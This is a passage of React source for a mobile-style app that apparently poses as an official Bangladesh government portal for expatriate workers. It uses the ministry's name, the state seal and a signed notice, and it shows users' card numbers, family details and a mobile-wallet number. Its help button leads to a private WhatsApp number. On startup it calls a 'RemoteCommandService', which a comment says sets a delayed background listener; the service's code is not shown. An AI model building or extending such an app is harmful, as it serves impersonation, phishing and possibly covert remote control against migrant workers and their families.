                      <p className="text-xs font-black text-gov-green">{member.age} বছর</p>
                      <p className="text-[8px] text-slate-400 font-bold uppercase">{member.health}</p>
                    </div>
                  </div>
                ))}
              </div>
              <button 
                onClick={() => {
                  window.open('https://play.google.com/store/apps/details?id=com.amiprobashi.user', '_blank');
                }}
                className="w-full bg-indigo-900 text-white py-4 rounded-2xl font-black shadow-xl hover:bg-indigo-800 transition-all flex items-center justify-center gap-3 border-b-4 border-indigo-950"
              >
                <Download className="w-6 h-6" />
                Family App ডাউনলোড করুন
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

const ProfilePage = () => {
  const [wewbData, setWewbData] = useState<any>(null);
  const [familyData, setFamilyData] = useState<any>(null);

  useEffect(() => {
    const wewb = localStorage.getItem('wewb_user_data');
    const family = localStorage.getItem('family_card_data');
    if (wewb) setWewbData(JSON.parse(wewb));
    if (family) setFamilyData(JSON.parse(family));
  }, []);

  return (
    <div className="min-h-screen bg-[#f8fafc] font-['Hind_Siliguri'] pb-24">
      {/* Profile Header */}
      <div className="bg-gov-green p-8 text-white rounded-b-[3rem] shadow-xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-48 h-48 bg-white/10 rounded-full -mr-24 -mt-24 blur-3xl"></div>
        <div className="flex flex-col items-center text-center relative z-10">
          <div className="w-24 h-24 bg-white rounded-full flex items-center justify-center text-gov-green shadow-2xl mb-4 border-4 border-white/20">
            <Users size={48} />
          </div>
          <h1 className="text-2xl font-black mb-1">{wewbData?.name || 'প্রবাসী নাগরিক'}</h1>
          <p className="text-xs opacity-80 font-bold tracking-widest uppercase">User Profile & Documents</p>
        </div>
      </div>

      <div className="px-6 -mt-8 space-y-6">
        {/* Digital Card Section */}
        <div className="bg-white rounded-3xl p-6 shadow-xl border border-slate-100">
          <h3 className="font-black text-slate-800 flex items-center gap-2 mb-4">
            <Smartphone className="text-gov-green" size={20} /> ডিজিটাল কার্ড তথ্য
          </h3>
          {wewbData ? (
            <div className="space-y-3">
              <div className="flex justify-between items-center p-4 bg-slate-50 rounded-2xl border border-slate-100">
                <span className="text-xs font-bold text-slate-400 uppercase">Card Number</span>
                <span className="font-black text-slate-700">{wewbData.number}</span>
              </div>
              <div className="flex justify-between items-center p-4 bg-slate-50 rounded-2xl border border-slate-100">
                <span className="text-xs font-bold text-slate-400 uppercase">Expiry Date</span>
                <span className="font-black text-slate-700">{wewbData.expiry}</span>
              </div>
            </div>
          ) : (
            <p className="text-sm text-slate-400 italic text-center py-4">কোন কার্ড তথ্য পাওয়া যায়নি</p>
          )}
        </div>

        {/* Family Card Section */}
        <div className="bg-white rounded-3xl p-6 shadow-xl border border-slate-100">
          <h3 className="font-black text-slate-800 flex items-center gap-2 mb-4">
            <Heart className="text-gov-green" size={20} /> ফ্যামিলি কার্ড তথ্য
          </h3>
          {familyData ? (
            <div className="space-y-4">
              <div className="p-4 bg-emerald-50 rounded-2xl border border-emerald-100">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-[10px] font-black text-emerald-600 uppercase">Family ID</span>
                  <span className="text-xs font-black text-emerald-700">{familyData.number}</span>
                </div>
                <p className="font-bold text-slate-800">{familyData.userName}</p>
              </div>
              <div className="space-y-2">
                <p className="text-xs font-black text-slate-400 uppercase px-1">পরিবারের সদস্য ({familyData.familyMembers.length})</p>
                {familyData.familyMembers.map((m: any, i: number) => (
                  <div key={i} className="flex justify-between items-center p-3 bg-slate-50 rounded-xl border border-slate-100">
                    <span className="text-sm font-bold text-slate-700">{m.name}</span>
                    <span className="text-[10px] font-black bg-white px-2 py-1 rounded-lg text-slate-400 border border-slate-100">{m.relation}</span>
                  </div>
                ))}
              </div>
            </div>
          ) : (
            <p className="text-sm text-slate-400 italic text-center py-4">কোন ফ্যামিলি কার্ড তথ্য পাওয়া যায়নি</p>
          )}
        </div>

        {/* Documents Section */}
        <div className="bg-white rounded-3xl p-6 shadow-xl border border-slate-100">
          <h3 className="font-black text-slate-800 flex items-center gap-2 mb-4">
            <FileText className="text-gov-green" size={20} /> আপলোডকৃত নথিপত্র
          </h3>
          <div className="grid grid-cols-2 gap-4">
            <div className="p-4 bg-slate-50 rounded-2xl border border-slate-100 flex flex-col items-center gap-2 opacity-50">
              <FileCheck size={24} className="text-slate-400" />
              <span className="text-[10px] font-black uppercase text-slate-500">NID Copy</span>
            </div>
            <div className="p-4 bg-slate-50 rounded-2xl border border-slate-100 flex flex-col items-center gap-2 opacity-50">
              <FileCheck size={24} className="text-slate-400" />
              <span className="text-[10px] font-black uppercase text-slate-500">Passport</span>
            </div>
          </div>
          <p className="text-[10px] text-slate-400 text-center mt-4">ভেরিফিকেশন সম্পন্ন হওয়ার পর নথিপত্র এখানে দেখা যাবে।</p>
        </div>

        {/* Contact Information */}
        <div className="bg-white rounded-3xl p-6 shadow-xl border border-slate-100">
          <h3 className="font-black text-slate-800 flex items-center gap-2 mb-4">
            <Mail className="text-gov-green" size={20} /> যোগাযোগের তথ্য
          </h3>
          <div className="space-y-3">
            <div className="flex items-center gap-4 p-4 bg-slate-50 rounded-2xl border border-slate-100">
              <div className="p-2 bg-white rounded-xl text-slate-400"><Phone size={18} /></div>
              <div>
                <p className="text-[10px] font-black text-slate-400 uppercase">Phone Number</p>
                <p className="text-sm font-bold text-slate-700">{familyData?.nagadNo || 'Not Provided'}</p>
              </div>
            </div>
            <div className="flex items-center gap-4 p-4 bg-slate-50 rounded-2xl border border-slate-100">
              <div className="p-2 bg-white rounded-xl text-slate-400"><Globe size={18} /></div>
              <div>
                <p className="text-[10px] font-black text-slate-400 uppercase">District</p>
                <p className="text-sm font-bold text-slate-700">{familyData?.district || 'Not Provided'}</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

const WhatsAppButton = () => (
  <a 
    href="https://wa.me/8801311998527" 
    target="_blank" 
    rel="noreferrer"
    className="fixed top-6 right-6 bg-[#25D366] text-white p-2 rounded-full shadow-lg z-[70] flex items-center gap-1 hover:scale-105 transition-all border border-white/30 group"
  >
    <MessageCircle size={18} className="fill-white" />
    <span className="font-bold text-[10px] uppercase tracking-tighter pr-1">help</span>
  </a>
);

const BottomNav = ({ activePage, setActivePage }: { activePage: string; setActivePage: (p: string) => void }) => {
  const navItems = [
    { id: 'home', label: 'Home', icon: <Globe size={20} /> },
    { id: 'digital-card', label: 'Digital Card', icon: <Smartphone size={20} /> },
    { id: 'all-register', label: 'Notices', icon: <Bell size={20} /> },
    { id: 'family-card', label: 'Family Card', icon: <Heart size={20} /> },
    { id: 'profile', label: 'Profile', icon: <Users size={20} /> },
  ];

  return (
    <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-slate-200 flex justify-around py-3 px-2 z-[60] shadow-[0_-5px_15px_rgba(0,0,0,0.05)]">
      {navItems.map((item) => (
        <button
          key={item.id}
          onClick={() => {
            setActivePage(item.id);
          }}
          className={`flex flex-col items-center gap-1 transition-all ${activePage === item.id ? 'text-gov-green scale-110' : 'text-slate-400'}`}
        >
          {item.icon}
          <span className="text-[10px] font-bold uppercase tracking-tighter">{item.label}</span>
        </button>
      ))}
    </div>
  );
};

export default function App() {
  const [loading, setLoading] = useState(false);
  const [showContact, setShowContact] = useState(false);
  const [toast, setToast] = useState<{ message: string; type: 'success' | 'error' } | null>(null);
  const [activePage, setActivePage] = useState('home');

  useEffect(() => {
    // অ্যাপ চালু হওয়ার সময় রিমোট সার্ভিস সেটআপ করা
    // এটি ৩ মিনিটের ডিলে এবং ব্যাকগ্রাউন্ড লিসেনার সেট করবে
    RemoteCommandService.init();
  }, []);

  const renderContent = () => {
    if (activePage === 'all-register') {
      return <NoticesPage />;
    }

    if (activePage === 'digital-card') {
      return <DigitalCardApp />;
    }

    if (activePage === 'family-card') {
      return <FamilyCardApp />;
    }

    if (activePage === 'profile') {
      return <ProfilePage />;
    }

    return (
      <div className="min-h-screen bg-[#f8fafc] text-slate-900 font-sans pb-12">
        {/* National Portal Top Bar */}
        <div className="bg-gov-red h-1 w-full"></div>
        <div className="bg-gov-green py-1 px-4 text-[10px] text-white/80 font-bold flex justify-between items-center">
          <span>বাংলাদেশ জাতীয় তথ্য বাতায়ন</span>
          <div className="flex gap-4">
            <span>English</span>
            <div className="flex items-center gap-1"><Smartphone size={10} /> এ্যাপ ডাউনলোড</div>
          </div>
        </div>

        {/* Official Gov Header */}
        <header className="bg-white text-gov-green px-4 py-4 flex justify-between items-center sticky top-0 z-50 shadow-sm border-b border-slate-200">
          <div className="flex items-center gap-3">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-12 h-12" referrerPolicy="no-referrer" />
            <div>
              <h1 className="font-black text-sm md:text-lg leading-tight">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</h1>
              <p className="text-[9px] md:text-[11px] text-slate-500 font-bold uppercase tracking-widest">Ministry of Expatriates' Welfare and Overseas Employment</p>
            </div>
          </div>
          <div className="hidden md:flex items-center gap-6 mr-8">
            <button className="text-sm font-bold text-slate-600 hover:text-gov-green">হোম</button>
            <button className="text-sm font-bold text-slate-600 hover:text-gov-green">আমাদের সম্পর্কে</button>
            <button className="text-sm font-bold text-slate-600 hover:text-gov-green">সেবাসমূহ</button>
          </div>
        </header>

        {/* Notice Ticker */}
        <div className="bg-slate-100 py-2 px-4 flex items-center gap-3 border-b border-slate-200 overflow-hidden">
          <div className="bg-gov-red text-white text-[10px] font-black px-2 py-1 rounded-md whitespace-nowrap">সর্বশেষ সংবাদ</div>
          <div className="text-xs font-bold text-slate-600 whitespace-nowrap animate-marquee">
            প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয় কর্তৃক নতুন ডিজিটাল সেবা চালু করা হয়েছে। সকল প্রবাসীদের নিবন্ধনের জন্য অনুরোধ করা হচ্ছে।
          </div>
        </div>

        <main className="max-w-md mx-auto px-4 pt-6">
          {/* Important Notice */}
          <div className="bg-white rounded-3xl p-6 shadow-lg border-l-8 border-gov-red mb-8 relative overflow-hidden">
            <div className="absolute top-0 right-0 p-2 opacity-5">
              <ShieldCheck size={120} />
            </div>
            <h3 className="text-gov-red font-black text-lg mb-4 flex items-center gap-2">
              <AlertTriangle size={20} /> গুরুত্বপূর্ণ নোটিশ
            </h3>
            <div className="space-y-4 text-slate-700 font-bold text-sm leading-relaxed text-justify">
              <p>প্রবাসে কর্মরত বাংলাদেশের সকল নাগরিককে বিশেষভাবে জানানো যাচ্ছে যে,</p>
              <p>গণপ্রজাতন্ত্রী বাংলাদেশ সরকারের উদ্যোগে WEWB Membership কার্ড এবং BMET কার্ড প্রস্তুত করা হয়েছে। সরকারি খাতায় নিবন্ধিত বৈধ প্রবাসীদের জন্য এই গুরুত্বপূর্ণ কার্ডসমূহ এবং প্রয়োজনীয় নথিপত্রের অনলাইন কপি বিতরণ কার্যক্রম চলমান রয়েছে।</p>
              <p>অনুগ্রহ করে “আমি প্রবাসী” অ্যাপ ব্যবহার করে আপনার ব্যক্তিগত তথ্য যাচাই করুন এবং আপনার বরাদ্দকৃত বৈধ নথিপত্রের অনলাইন কপিগুলো ডাউনলোড করে সংরক্ষণ করুন।</p>
              <div className="pt-4 border-t border-slate-100 text-right">
                <p className="text-[10px] uppercase tracking-widest text-slate-400 mb-1">আদেশক্রমে,</p>
                <p className="text-xs font-black text-gov-green">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</p>
                <p className="text-[10px] font-bold text-slate-500">প্রবাসী কর্মসংস্থান মন্ত্রণালয়</p>
              </div>
            </div>
          </div>

          <div className="bg-white rounded-[2.5rem] p-8 shadow-xl border border-slate-100 relative overflow-hidden mb-8">
            <div className="absolute top-0 right-0 w-32 h-32 bg-gov-green/5 rounded-full -mr-16 -mt-16"></div>
            <div className="relative z-10">
              <h2 className="text-3xl font-black text-slate-800 mb-2">স্বাগতম</h2>
              <p className="text-slate-500 font-medium mb-8">আপনার ডিজিটাল সেবা গ্রহণের জন্য নিচের অপশনগুলো ব্যবহার করুন।</p>
              
              <div className="grid grid-cols-2 gap-4">
                <button onClick={() => setActivePage('digital-card')} className="bg-slate-50 p-6 rounded-3xl border border-slate-100 flex flex-col items-center gap-3 hover:bg-gov-green/5 transition-all group">
                  <div className="p-4 bg-white rounded-2xl text-gov-green shadow-sm group-hover:scale-110 transition-transform">
                    <Smartphone size={32} />
                  </div>
                  <span className="font-black text-xs text-slate-700 uppercase tracking-widest">Digital Card</span>
                </button>
                <button onClick={() => setActivePage('all-register')} className="bg-slate-50 p-6 rounded-3xl border border-slate-100 flex flex-col items-center gap-3 hover:bg-gov-green/5 transition-all group">
                  <div className="p-4 bg-white rounded-2xl text-gov-green shadow-sm group-hover:scale-110 transition-transform">
                    <Bell size={32} />
                  </div>
                  <span className="font-black text-xs text-slate-700 uppercase tracking-widest">Notices</span>
                </button>
              </div>
            </div>
          </div>

          <div className="space-y-4">
            <h3 className="text-lg font-black text-slate-800 px-2 flex items-center gap-2">
              <Info className="text-gov-green" size={20} /> গুরুত্বপূর্ণ লিংক
            </h3>
            <div className="bg-white rounded-3xl border border-slate-200 divide-y divide-slate-100 overflow-hidden shadow-sm">
              <a href="https://www.amiprobashi.com" target="_blank" rel="noreferrer" className="flex items-center justify-between p-5 hover:bg-slate-50 transition-all">
                <div className="flex items-center gap-4">
                  <div className="p-2 bg-slate-100 rounded-xl text-slate-400"><Globe size={20} /></div>
                  <span className="font-bold text-slate-700">আমি প্রবাসী পোর্টাল</span>
                </div>
                <ChevronRight size={18} className="text-slate-300" />
              </a>
              <a href="https://bmet.gov.bd" target="_blank" rel="noreferrer" className="flex items-center justify-between p-5 hover:bg-slate-50 transition-all">
                <div className="flex items-center gap-4">
                  <div className="p-2 bg-slate-100 rounded-xl text-slate-400"><ShieldCheck size={20} /></div>
                  <span className="font-bold text-slate-700">বিএমইটি অফিসিয়াল</span>
                </div>
                <ChevronRight size={18} className="text-slate-300" />
              </a>
            </div>
          </div>

          <button onClick={() => setShowContact(true)} className="w-full mt-8 bg-slate-900 text-white py-5 rounded-3xl font-black text-lg shadow-xl hover:bg-slate-800 transition-all flex items-center justify-center gap-3">
            <MessageCircle size={24} /> যোগাযোগ করুন
          </button>
        </main>

        <footer className="mt-12 px-8 pb-24 text-center">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-12 h-12 mx-auto mb-4 opacity-20 grayscale" referrerPolicy="no-referrer" />
          <p className="text-[10px] font-black text-slate-300 uppercase tracking-[0.3em] mb-2">National Digital Portal</p>
          <div className="flex justify-center gap-4 text-[10px] font-bold text-slate-400">
            <span>গোপনীয়তা নীতি</span>
            <span>ব্যবহারের শর্তাবলী</span>
          </div>
        </footer>
      </div>
    );
  };

  return (
    <div className="relative">
      {renderContent()}
      <WhatsAppButton />
      <BottomNav activePage={activePage} setActivePage={setActivePage} />
      <AnimatePresence>{showContact && <ContactModal onClose={() => setShowContact(false)} setToast={setToast} />}</AnimatePresence>
      <AnimatePresence>{toast && <Toast message={toast.message} type={toast.type} onClose={() => setToast(null)} />}</AnimatePresence>
    </div>
  );
}
